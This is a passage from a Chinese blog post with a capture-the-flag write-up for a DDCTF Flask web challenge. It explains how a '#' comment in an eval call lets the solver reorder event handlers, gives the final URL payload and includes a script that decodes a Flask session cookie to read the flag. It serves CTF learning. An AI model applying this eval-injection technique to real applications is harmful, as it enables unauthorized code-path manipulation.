+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	num_items = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">	session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">	trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">	session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure>
+<p>一开始认为的思路是修改session值来改变num_items，points字段的值来执行该函数。在flask中，session是经过参数app.secret_key来进行加密的，所以我们还必须得到加密的key，才能伪造session以获取flag，而获取该key则必须通过参数对代码进行注入，得到<code>app.secret_key</code></p>
+<p>找出的可能存在的注入点在<code>buy_handler</code>函数，通过python3的格式化字符format存在的漏洞注入得到配置信息，但是服务器端对用户的输入存在白名单过滤：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">	valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br></pre></td></tr></table></figure>
+<p>故该方法无效，其实这题只是考察单纯绕过代码逻辑来调用<code>get_flag_handler</code>函数，我们可以注意，服务器执行的函数取决点在于列表<code>request.event_queue</code>，只要列表<code>request.event_queue</code>中还有事件，就会通过<code>eval</code>函数执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">	ret_val = event_handler(args)</span><br></pre></td></tr></table></figure>
+<p>而列表<code>request.event_queue</code>是通过函数<code>trigger_event</code>进行改变的，所以我们可以通过调用<code>trigger_event</code>函数来进行多函数调用</p>
+<p>按照正常的逻辑而言，如果我们正常调用<code>buy_handler</code>函数，并且传入的参数为5，payload为：<code>?action:buy;5</code>执行到最后会执行语句<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>，这时候事情列表<code>request.event_queue</code>中就会添加两个事件<code>consume_point_function</code>和<code>view_handler</code>，也就是说，接下来调用的函数必然是<code>consume_point_function</code>，执行到该函数中的判断语句<code>if session[&#39;points&#39;] &lt; point_to_consume: raise RollBackException()</code>时，由于<code>session[&#39;points&#39;]</code>小于5，则出现了报错信息</p>
+<p>但是如果我们控制事件列表<code>request.event_queue</code>中的事件顺序为：<code>buy_handler,get_flag_handler,comsume_point_function</code>，那么由于<code>buy_handler</code>函数中的语句<code>session[&#39;num_items&#39;] += num_items</code>，此时<code>session[&#39;num_items&#39;]</code>被设置为了5，执行下一个函数<code>get_flag_handler</code>时，就能成功执行语句：<code>if session[&#39;num_items&#39;] &gt;= 5:trigger_event(&#39;func:show_flag;&#39; + FLAG())</code></p>
+<p>所以最终的payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>
+<p>首先调用的函数是<code>trigger_event</code>，注意到这里的<code>%23</code>即<code>#</code>，在python的<code>eval</code>函数中，注释符同样能注释掉后面的语句，也就是说注释掉了后面的字符串<code>_handler</code>或<code>_fuction</code>，测试如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"hello"</span>)</span><br><span class="line">	</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = eval(<span class="string">'hello#aaa'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a()</span><br><span class="line">hello</span><br></pre></td></tr></table></figure>
+<p>传入<code>trigger_event</code>的参数为列表<code>[action:buy;5,action:get_flag;]</code>，函数执行完毕后，此时事件列表<code>request.event_queue</code>的内容为：<code>[action:buy;5,action:get_flag;]</code></p>
+<p>下一个调用函数为：<code>buy_handler</code>，传入的参数为5，此时事件列表<code>request.event_queue</code>的内容为：<code>[action:get_flag;]</code>，当函数<code>buy_handler</code>执行到语句<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>时，事件列表中又添了新的事件，此时内容为：<code>[action:get_flag;,func:consume_point;5,action:view;index]</code></p>
+<p>那么下一个调用的函数便为<code>get_flag</code>，因为此时刚执行完函数<code>buy_handler</code>，<code>session[&#39;num_items&#39;] == 5</code>，所以执行语句<code>trigger_event(&#39;func:show_flag;&#39; + FLAG())</code>，此时事件列表中又添加了新的内容：<code>fuction:show_flag;</code>拼接上<code>FLAG()</code>函数执行结果</p>
+<p>我们可以执行到<code>trigger_event</code>函数中的语句：<code>session[&#39;log&#39;].append(event)</code>，即<code>session[&#39;log&#39;]</code>字段中存储着每次新添加进来的事件，所以必然有<code>FLAG()</code>函数执行结果</p>
+<p>所以最后我们需要解密<code>session</code>字段，通过下列脚本代码解密：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ddctf\12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>解密结果中获得flag，从<code>log</code>字段内容也验证之前的过程分析</p>
+<p>最终的flag为：<code>DDCTF{3v4l_3v3nt_100p_aNd_fLASK_cOOkle}</code></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-04-19T14:18:29.885Z" itemprop="dateUpdated">2019-04-19 22:18:29</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/6882/" target="_blank" rel="external">https://Foxgrin.github.io/posts/6882/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/6882/&title=《DDCTF-Web》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/6882/&title=《DDCTF-Web》 — Somnus's blog&source=这场比赛难度虽然大，但是一路做下来收获还是蛮大的" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/6882/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《DDCTF-Web》 — Somnus's blog&url=https://Foxgrin.github.io/posts/6882/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/6882/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/43152/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：第十二届全国大学生信息安全竞赛-Web
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/42277/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：杭州&#34;西湖论剑&#34;ctf-Web">下一篇：杭州&#34;西湖论剑&#34;ctf-Web</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/6882/&title=《DDCTF-Web》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/6882/&title=《DDCTF-Web》 — Somnus's blog&source=这场比赛难度虽然大，但是一路做下来收获还是蛮大的" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/6882/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《DDCTF-Web》 — Somnus's blog&url=https://Foxgrin.github.io/posts/6882/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/6882/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABx0lEQVR42u3aSW7DMAwF0Nz/0inQVYvEyidpqwb6tAoUDy9ZEBz0eMTr+b1ed37uH11ztPP67WkLFxd3zH0u1/yanL5+Ai4u7n7uOnitHzHB5QZcXNx7cvOflOzg4uL+H25eMuHi4t6f2ytd8pWkRCfXari4uANutWF6xecL+7u4uLhF7iQY9QYkefB683ZcXNwt3F5BUm2V9kJYISPDxcU9lVu9bRLgPvxnvTMguLi4G7nzNCUftxQGuri4uFu4vdcXsqc4JSokWLi4uBdz8wB0VuuzOpL5dRcuLu4WbvW2vECqHr9oFkK4uLgXcNfFT1IC5T8mabB+CKa4uLgbub3Va2rkQ5dyWoOLi3sStzcE7QW4/KhWofjBxcW9mDsZsiYhaT6gxcXF3cNdB51qezS5qxq2DosfXFzcLdx8pLHe7+GSIxq4uLh7uPNGZ5Li9BBlNC4u7kncSZO0OiapjmZxcXH/ijs5+TAfiuRPwMXF3c+dlD2TVKYZyHBxcTdy80BTbYz2IuiHtikuLu5tuOukZDJqLRRduLi4N+ZWr0kCXxTscHFxN3InxU8e2vIy6ZCOi4u7hTtvmCYN0OqgZUTHxcXtc78AT617ijZ+/oYAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
